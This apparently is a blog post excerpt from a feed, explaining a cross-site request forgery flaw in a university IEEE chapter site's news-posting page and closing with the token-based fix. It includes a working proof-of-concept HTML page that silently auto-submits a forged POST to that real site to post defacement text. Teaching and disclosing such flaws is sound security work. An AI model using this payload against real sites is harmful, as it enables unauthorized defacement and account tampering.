<span class="s1">$add_news_result = mysql_query($add_news_query);</span>

<span class="s1">if($add_news_result)</span>
<span class="s1">{</span>
<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">success</span><span class="o">=</span><span class="k">true</span><span class="s1">&#39;);</span>
<span class="s1">}</span>
<span class="s1">else</span>
<span class="s1">{</span>
<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">error</span><span class="o">=</span><span class="nx">unable_to_post_news</span><span class="err">&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
<span class="c1">// done</span></code></pre></div></p>

<p>The important part to notice here is that there is no code that ensures the
legitimacy of the request, that is, that a currently authenticated admin
user actually meant to make this request. In this scenario if we can somehow
find a way to get the admin to
submit an arbitrary POST request to the <code>add-news.php</code> page, since she already
has the session all set up in her browser, we can bypass the session checks
previously shown and add arbitrary news to the website, for example.</p>

<p>You might be wondering how we can get the admin to submit arbitrary POST requests
without her noticing. The most obvious answer is physical access to the her
machine while she&rsquo;s away or something, but a much more realistic scenario
would be if we would get the admin
to browse to a web page that we (the attacker) control, we can use some nifty
JavaScript magic to get her to automatically submit the proper POST request
on our behalf.</p>

<p>This is called <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF">Cross Site Request Forgery</a>).</p>

<p>It turns out that these types of malicious pages are actually very simple
to write. Remember, all that&rsquo;s really needed is JavaScript execution, so
for example if you had previous knowledge of a site that the admin frequented
that had an XSS vulnerability, that would be a perfect way to chain these attacks.
Anyway, here&rsquo;s an example malicious page <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<p><div class="highlight"><pre><code class="language-html" data-lang="html"><span class="ni">&amp;lt;</span>!DOCTYPE HTML&gt;
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>non-malicious website! :)<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;thisform&quot;</span> <span class="na">action=</span><span class="s">&quot;http://www.ieee.neu.edu/add-news.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span>
          <span class="na">style=</span><span class="s">&quot;display:none;&quot;</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;news_title&quot;</span> <span class="na">value=</span><span class="s">&quot;breaking news: u got hacked&quot;</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;post&quot;</span> <span class="na">value=</span><span class="s">&quot;insert website defacement here&quot;</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;</span>
        <span class="kd">var</span> <span class="nx">frm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">thisform</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
        <span class="nx">frm</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></div></p>

<p>Nothing fancy here, just a simple hidden form with the values you want to submit
to the page, and some JS that submits the form.</p>

<p>A caveat: Yes, it is true that you would
have to guess the proper field names (&ldquo;posts&rdquo;, &ldquo;news_title&rdquo;) but even if you can
only guess &ldquo;posts&rdquo;, you can write anything into the body of the news post.</p>

<p>End result looks something like this.</p>

<p><img src="/images/ieee_csrf.gif" alt="" /></p>

<p>There was an identical bug in the code that handles editing users. Let&rsquo;s
have some fun!</p>

<p><img src="/images/ieee_csrf2.gif" alt="" /></p>

<p>In both of these gifs, the admin user was logged in, and then they opened
a malicious html file, simulating visiting a malicious website. The mere act of
opening the web page triggered the payload which sent the POST to the server,
adding the news, and changing the user.</p>

<p>So how do we fix this sort of thing? The most common way involves the server
requiring a randomly generated, non-predictable token that is associated with
the user session with each request. An example could be that every time the
actual admin web interface form is loaded, it contains a hidden field, invisible
to the admin, with this token that is sent along with the request. The server
verifies that it sent this token out previously, and that the token hasn&rsquo;t expired,
and if everything else checks out, the request goes through.
This crucial missing piece of information will prevent attackers from
successfully faking requests as the authenticated user.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>For more examples of how to trigger your CSRF payload via JavaScript, check out the excellent <a href="http://edgeguides.rubyonrails.org/security.html#cross-site-request-forgery-csrf">Ruby on Rails Security Guide</a><a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
</feed>
